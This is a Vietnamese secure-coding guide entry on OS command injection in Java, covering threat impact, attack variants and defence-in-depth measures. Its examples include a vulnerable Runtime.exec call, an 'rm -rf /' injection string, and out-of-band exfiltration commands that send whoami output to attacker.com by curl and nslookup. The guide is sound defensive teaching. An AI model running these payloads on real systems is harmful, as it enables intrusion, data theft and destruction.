---
tier: 1
id: command-injection
title: OS Command Injection (Remote Code Execution)
cwe: [CWE-78]
owasp: [A03:2021]
tags: [example, command-injection, cmdi, cwe-78, injection, java, rce, a03, remote-code-execution]
references:
  - https://owasp.org/Top10/A03_2021-Injection/
  - https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
  - https://cwe.mitre.org/data/definitions/78.html
---

# Command Injection — Runtime.exec / OS Command Injection

## 1. Khái niệm & Mối đe dọa (Overview & Threat Impact)

OS Command Injection (hay Command Injection / Remote Code Execution - RCE) là lỗ hổng bảo mật nghiêm trọng xảy ra khi ứng dụng truyền dữ liệu không tin cậy từ người dùng vào một shell hệ điều hành hệ thống để thực thi câu lệnh mà không qua cơ chế phân tách đối số hoặc kiểm duyệt danh sách trắng. 

Hậu quả của Command Injection thường mang tính hủy diệt đối với hệ thống:
- **Thực thi mã từ xa (Remote Code Execution - RCE):** Kẻ tấn công có thể thực thi bất kỳ lệnh hệ thống nào dưới quyền của tiến trình máy chủ web.
- **Toàn quyền kiểm soát máy chủ:** Đọc trích xuất toàn bộ mã nguồn, tệp cấu hình chứa khóa bí mật (`.env`, credentials), và dữ liệu người dùng.
- **Leo thang đặc quyền & Chiếm quyền hạ tầng:** Sử dụng máy chủ bị xâm nhập làm bàn đạp (pivot) để tấn công sâu vào mạng nội bộ hoặc cài đặt mã độc, backdoor, botnet.

## 2. Các biến thể phổ biến (Common Attack Variants)

### 2.1. Nối chuỗi trực tiếp vào Runtime.exec / Shell Call

Biến thể phổ biến nhất trong các ứng dụng Java xuất hiện khi lập trình viên nối trực tiếp biến người dùng vào một chuỗi câu lệnh OS thông qua `Runtime.getRuntime().exec()` hoặc `ProcessBuilder`:

```java
// LỖ HỔNG: Biến userControlled được nối trực tiếp vào chuỗi lệnh
Runtime.getRuntime().exec(userControlled);
```

OpenGrep rule `java-command-execution` bắt pattern này khi phát hiện lệnh thực thi nhận đầu vào không an toàn.

Nếu `userControlled` chứa các ký tự điều khiển shell (Shell Metacharacters) như `; rm -rf /`, `&&`, `|`, hoặc dấu backtick `` ` ``, kẻ tấn công có thể ghép thêm lệnh tùy ý để thực thi song song.

### 2.2. Chèn đối số độc hại (Argument Injection)

Ngay cả khi không chạy qua shell (`/bin/sh -c`), việc truyền trực tiếp tham số người dùng vào các tiện ích hệ thống (như `tar`, `curl`, `git`, `ssh`) vẫn có thể bị lợi dụng nếu đối số chứa các cờ nhạy cảm (ví dụ `--output`, `-e`, `--exec`) cho phép ghi đè file hoặc chạy script tùy ý.

### 2.3. Blind Command Injection (Time-based & Out-of-Band)

Khi máy chủ không trả về kết quả đầu ra (stdout/stderr) của lệnh trên giao diện web, kẻ tấn công xác nhận và trích xuất dữ liệu bằng các kỹ thuật:
- **Time-based Blind:** Chèn lệnh gây trễ như `ping -c 5 127.0.0.1` hoặc `sleep 10`.
- **Out-of-Band (OOB) Exfiltration:** Gửi dữ liệu ra máy chủ bên ngoài qua DNS lookup hoặc HTTP request (ví dụ: `curl http://attacker.com/$(whoami)` hoặc `nslookup $(whoami).attacker.com`).

## 3. Nguyên tắc phòng thủ đa lớp (Defense-in-Depth Strategy)

Chiến lược phòng thủ toàn diện chống Command Injection bao gồm:

1. **Lớp 1 — Tránh tuyệt đối việc gọi Shell hệ điều hành (Avoid Shell Execution):**
   Ưu tiên sử dụng trực tiếp các thư viện API có sẵn của ngôn ngữ lập trình (như thư viện quản lý file `java.nio.file.Files`, thư viện mạng Java) thay vì gọi các lệnh OS tương ứng (`rm`, `mkdir`, `ping`, `curl`).
2. **Lớp 2 — Tách rời Command và Arguments bằng ProcessBuilder:**
   Nếu bắt buộc phải gọi tiến trình bên ngoài, không bao giờ dùng shell wrapper (`/bin/sh -c`). Luôn sử dụng `ProcessBuilder` truyền danh sách các đối số tách rời (`List<String> args`), khiến hệ điều hành hiểu mỗi phần tử là một tham số độc lập và không phân tích cú pháp ký tự điều khiển.
3. **Lớp 3 — Danh sách trắng nghiêm ngặt (Strict Input Allowlist):**
   Ràng buộc đầu vào bằng danh sách trắng các ký tự an toàn (chẳng hạn chỉ cho phép `[a-zA-Z0-9_-]`) hoặc ánh xạ giá trị đầu vào với tập hợp các hành động định trước (Enum/Lookup map). Không nối chuỗi lệnh.
4. **Lớp 4 — Phân quyền tiến trình tối thiểu & Sandbox:**
   Chạy ứng dụng dưới tài khoản hệ điều hành có quyền tối thiểu, không chạy dưới quyền `root`/`Administrator`. Triển khai trong container bị giới hạn quyền (Read-Only Root Filesystem, Drop Capabilities như `CAP_SYS_ADMIN`).

## 4. Tài liệu tham khảo thẩm quyền (Authoritative References)

- [OWASP Top 10:2021 — A03: Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [OWASP OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')](https://cwe.mitre.org/data/definitions/78.html)
